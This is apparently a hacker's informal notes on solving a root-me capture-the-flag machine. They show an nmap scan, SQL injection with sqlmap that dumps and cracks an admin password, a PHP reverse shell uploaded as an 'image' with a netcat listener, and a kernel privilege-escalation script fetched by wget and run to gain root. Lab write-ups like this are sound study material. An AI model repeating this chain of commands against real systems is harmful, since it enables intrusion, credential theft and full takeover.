@@ -1,0 +1,246 @@
+root@kdog:~/ctf_april/lamp_6# nmap -sS -sV -A -O -T5 ctf01.root-me.org
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-25 22:40 MDT
+Warning: 212.129.28.18 giving up on port because retransmission cap hit (2).
+Nmap scan report for ctf01.root-me.org (212.129.28.18)
+Host is up (0.10s latency).
+Not shown: 989 closed ports
+PORT     STATE    SERVICE  VERSION
+22/tcp   open     ssh      OpenSSH 4.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 14:a9:f4:11:dc:2c:4e:0d:45:6c:99:11:22:29:03:bc (DSA)
+|_  2048 45:58:6c:98:3e:97:2a:da:e2:b8:6a:84:d4:6a:be:26 (RSA)
+25/tcp   filtered smtp
+80/tcp   open     http     Apache httpd 2.2.3 ((CentOS))
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: CTF 6 - Widgets Inc.
+110/tcp  open     pop3     Dovecot pop3d
+|_pop3-capabilities: STLS SASL(PLAIN) UIDL USER PIPELINING TOP RESP-CODES CAPA
+| ssl-cert: Subject: commonName=imap.example.com
+| Not valid before: 2009-06-23T23:53:41
+|_Not valid after:  2010-06-23T23:53:41
+|_ssl-date: 2017-05-26T04:40:52+00:00; +4s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+111/tcp  open     rpcbind  2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1            622/udp  status
+|_  100024  1            625/tcp  status
+143/tcp  open     imap     Dovecot imapd
+|_imap-capabilities: completed LITERAL+ MULTIAPPEND UNSELECT SASL-IR THREAD=REFERENCES IMAP4rev1 AUTH=PLAINA0001 STARTTLS CHILDREN LOGIN-REFERRALS NAMESPACE IDLE OK Capability SORT
+| ssl-cert: Subject: commonName=imap.example.com
+| Not valid before: 2009-06-23T23:53:41
+|_Not valid after:  2010-06-23T23:53:41
+|_ssl-date: 2017-05-26T04:40:52+00:00; +4s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+443/tcp  open     ssl/http Apache httpd 2.2.3 ((CentOS))
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: CTF 6 - Widgets Inc.
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-06-02T16:13:30
+|_Not valid after:  2010-06-02T16:13:30
+|_ssl-date: 2017-05-26T04:40:52+00:00; +4s from scanner time.
+625/tcp  open     status   1 (RPC #100024)
+993/tcp  open     ssl/imap Dovecot imapd
+|_imap-capabilities: LITERAL+ MULTIAPPEND UNSELECT completed THREAD=REFERENCES SASL-IR IMAP4rev1 AUTH=PLAINA0001 CHILDREN LOGIN-REFERRALS NAMESPACE IDLE OK Capability SORT
+| ssl-cert: Subject: commonName=imap.example.com
+| Not valid before: 2009-06-23T23:53:41
+|_Not valid after:  2010-06-23T23:53:41
+|_ssl-date: 2017-05-26T04:40:52+00:00; +4s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+995/tcp  open     ssl/pop3 Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) UIDL USER PIPELINING TOP RESP-CODES CAPA
+| ssl-cert: Subject: commonName=imap.example.com
+| Not valid before: 2009-06-23T23:53:41
+|_Not valid after:  2010-06-23T23:53:41
+|_ssl-date: 2017-05-26T04:40:51+00:00; +4s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+3306/tcp open     mysql    MySQL 5.0.45
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.0.45
+|   Thread ID: 14
+|   Capabilities flags: 41516
+|   Some Capabilities: SupportsCompression, Support41Auth, ConnectWithDatabase, SupportsTransactions, LongColumnFlag, Speaks41ProtocolNew
+|   Status: Autocommit
+|_  Salt: xB{gs.)#p-/DGwC*DWj/
+Device type: general purpose|printer|bridge
+Running (JUST GUESSING): QEMU (94%), GNU Hurd (87%), HP embedded (86%), Minolta embedded (86%), NEC embedded (86%), Konica Minolta embedded (85%), Linux (85%), Oracle Virtualbox (85%)
+OS CPE: cpe:/a:qemu:qemu cpe:/o:gnu:hurd cpe:/h:konicaminolta:7035 cpe:/o:linux:linux_kernel:2.6.18 cpe:/o:oracle:virtualbox
+Aggressive OS guesses: QEMU user mode network gateway (94%), GNU Hurd 0.3 (87%), HP 9100c Digital Sender printer (J3113A) (86%), Minolta Di550 laser printer (86%), NEC SuperScript printer (86%), Konica Minolta 7035 printer (85%), Linux 2.6.18 (CentOS 5, x86_64, SMP) (85%), Oracle Virtualbox (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+Host script results:
+|_clock-skew: mean: 3s, deviation: 0s, median: 3s
+
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.93 ms 10.0.2.2
+2   1.28 ms ctf01.root-me.org (212.129.28.18)
+
+found an injection param after messing with a login endpoint by spamming url bar with bullshit and old reliable ( 'or 1=1 # )
+
+sqlmap:   
+
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.84 seconds
+root@kdog:~/ctf_april/lamp_6# sqlmap -u "http://ctf01.root-me.org/?id=2" --dbs --dump
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.1.4#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 22:43:13
+
+.
+.
+.
+.
+.
+
+
+[22:44:12] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[22:44:17] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[22:44:17] [INFO] starting 2 processes 
+[22:44:18] [INFO] cracked password 'adminpass' for hash '25e4ee4e9229397b6b17776bfceaf8e7'
+[22:44:23] [INFO] postprocessing table dump                                    
+Database: cms
+Table: user
+[1 entry]
++---------+---------------+----------------------------------------------+
+| user_id | user_username | user_password                                |
++---------+---------------+----------------------------------------------+
+| 1       | admin         | 25e4ee4e9229397b6b17776bfceaf8e7 (adminpass) |
++---------+---------------+----------------------------------------------+
+
+[22:44:23] [INFO] table 'cms.`user`' dumped to CSV file '/root/.sqlmap/output/ctf01.root-me.org/dump/cms/user.csv'
+[22:44:23] [INFO] fetching columns for table 'event' in database 'cms'
+[22:44:23] [INFO] fetching entries for table 'event' in database 'cms'
+[22:44:23] [INFO] analyzing table dump for possible password hashes
+Database: cms
+Table: event
+[4 entries]
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
+| 1       | 3        | 10         | files/
+media-optical-bd.png               | <p>Praesent magna est, semper vitae 
+euismod vitae, scelerisque eu nunc. Proin sed nibh a nisl tempus fringilla 
+vitae ac nunc. Maecenas diam ipsum, ultrices vel faucibus non, suscipit nec 
+felis. Praesent eleifend turpis vel orci sollicitudin quis tincidunt ante 
+dapibus. Mauris laoreet mi vel nunc lacinia nec pulvinar lectus congue. 
+Praesent imperdiet sollicitudin urna, sit amet auctor magna eleifend vel. 
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vivamus elementum, 
+magna vel venenatis pellentesque, nibh orci sollicitudin sapien, in tempor 
+sem orci non metus. Nulla interdum feugiat ultrices. Nam egestas nulla quis 
+dolor aliquam a iaculis arcu lobortis. Vestibulum urna leo, condimentum 
+varius porttitor sed, tincidunt id est. Suspendisse potenti. Nulla 
+fringilla massa ac arcu tempor molestie. Vivamus vehicula aliquet enim, eu 
+porttitor libero suscipit non. </p>                                         
+|
+
+(many documents later...)
+
+bunch of weird shit, kind of cool I wonder if it has anything useful                         
+
+[22:44:23] [INFO] table 'cms.event' dumped to CSV file '/root/.sqlmap/output/ctf01.root-me.org/dump/cms/event.csv'
+[22:44:23] [INFO] fetched data logged to text files under '/root/.sqlmap/output/ctf01.root-me.org'
+
+[*] shutting down at 22:44
+
+log in as admin - adminpass...
+
+Alright. Looks like we have a file inclusion vuln. 
+This admin account portrays a type of crude CMS.
+An "image" can be uploaded as part of a new event, and
+if this image happens to be a php shell linking back to me (PORT FORWARD), 
+a listener can be set up so when the page referencing a path to this shell (the homepage, where the "image" is shown) refreshes, the php is run.  
+
+
+
+nc -v -n -l -p 4447
+
+we innnnn
+
+sh-3.2$ whoami
+apache
+
+yay more usernames..
+
+sh-3.2$ ls
+fred
+john
+linda
+molly
+toby
+sh-3.2$ 
+
+
+PRIVESC TIME. Local privesc did not work, so next step is some 
+googling for a Linux kernel 2.6.x exploit
+
+found it, udev.sh. 
+
+copy + paste to pastebin, then wget from shell
+
+wget (pastebin address) --no-check-certificate
+
+sed -i -e '$a\' udev.sh -- add a newline char
+sed -i '/\r/\\' udev.sh -- append a linux readable tag
+chmod 755 udev.sh
+./udev.sh
+
+(bit slow...)
+
+!
+sh: line 4: syntax error near unexpected token `newline'
+sh: line 4: `!'
+sh-3.2$ ./udev.sh 402
+suid.c: In function 'main':
+suid.c:3: warning: incompatible implicit declaration of built-in function 'execl'
+cp: `libno_ex.so.1.0' and `/tmp/libno_ex.so.1.0' are the same file
+id
+uid=0(root) gid=0(root) groups=48(apache)
+
+I am curious if u can ssh into the system instead and go from there
+
+
+
+
+
